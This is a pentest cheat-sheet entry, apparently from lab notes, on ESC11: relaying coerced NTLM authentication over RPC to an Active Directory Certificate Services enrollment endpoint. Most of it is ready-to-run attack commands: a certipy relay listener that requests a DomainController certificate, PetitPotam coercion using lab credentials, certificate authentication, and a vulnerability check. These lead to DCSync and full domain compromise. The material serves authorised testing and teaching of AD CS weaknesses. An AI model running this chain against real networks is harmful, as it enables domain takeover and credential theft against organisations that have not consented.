# 13.04 ESC11 NTLM Relay to ADCS ICPR RPC Endpoint

> Relay coerced SMB NTLM over RPC/ICPR with `certipy relay -target rpc://` when `IF_ENFORCEENCRYPTICERTREQUEST` is off.

## Overview

ESC11 is the RPC/ICPR equivalent of ESC8. When the IF_ENFORCEENCRYPTICERTREQUEST flag is not set on the CA, coerced SMB NTLM authentication can be relayed over RPC to the certificate enrollment endpoint. certipy relay with -target rpc:// and explicit -ca name handles this. The post-exploitation chain (DCSync, Silver Ticket) is identical to ESC8.

## Steps

- Confirm: certipy find shows "Enforce Encryption for Requests: Disabled" and ESC11 in Vulnerabilities
- Start certipy relay with -target rpc://<ADCS_IP> and -ca <CA_NAME> and -template DomainController
- Coerce authentication from DC using PetitPotam (SMB coercion, relayed over RPC by certipy)
- certipy relay saves lab-dc.pfx on success
- Continue with same post-exploitation chain as ESC8

## Commands

### certipy relay ESC11 (listen)

```bash
sudo certipy relay -target "rpc://172.16.19.5" -ca "lab-WS01-CA" -template DomainController
```

### PetitPotam coerce for ESC11

```bash
python3 PetitPotam.py -u BlWasp -p 'Password123!' -d 'lab.local' 172.16.19.19 172.16.19.3
```

### certipy auth DC cert

```bash
certipy auth -pfx lab-dc.pfx
```

### certipy find ESC11 check

```bash
certipy find -u blwasp -p 'Password123!' -dc-ip 172.16.19.3 -vulnerable -stdout
```
